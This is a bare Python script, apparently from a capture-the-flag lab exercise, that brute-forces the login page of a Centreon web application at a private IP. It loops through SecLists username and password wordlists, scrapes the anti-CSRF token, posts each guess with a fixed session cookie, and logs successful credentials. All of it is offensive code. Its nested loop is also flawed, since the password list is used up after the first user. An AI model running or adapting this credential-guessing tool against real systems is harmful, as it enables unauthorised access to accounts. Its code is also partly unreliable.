import os              
import socket       
import urllib.request
from urllib import parse, request
from bs4 import BeautifulSoup
import requests                             

def brute():
    url = "http://10.10.10.157/centreon/index.php"
    userlist = open("/home/tools/wordlists/SecLists/Usernames/top-usernames-shortlist.txt","r")
    passlist = open("/home/tools/wordlists/SecLists/Passwords/probable-v2-top12000.txt", "r")
    valid_users = open("valid_users.log", "w")
    for user in userlist:
        for password in passlist:
            index = urllib.request.urlopen(url)
            soup = BeautifulSoup(index.read(), 'html.parser')
            token = soup.find(attrs={"name": "centreon_token"})
            dict = {'useralias':user[:-1], 'password':password[:-1],'submitLogin':'Connect','centreon_token':token['value']}
            con = urllib.parse.urlencode(dict).encode('utf-8')
            headers={'Cookie':'PHPSESSID=6vja2la9rbol7p5f73gjbtif7a','Content-Type':'application/x-www-form-urlencoded'}
            req = requests.post("http://10.10.10.157/centreon/index.php",data=con, headers=headers)
            if("Your credentials are incorrect." in req.text):
                print ("[-] Incorrect credentials: %s:%s"%(user,password))
            else:
                print("[+] Credentails found: %s:%s"%(user,password))
                valid_users.write("[+] Credentails found: %s:%s"%(user,password))
    valid_users.close()
    userlist.close()
    passlist.close()

brute()
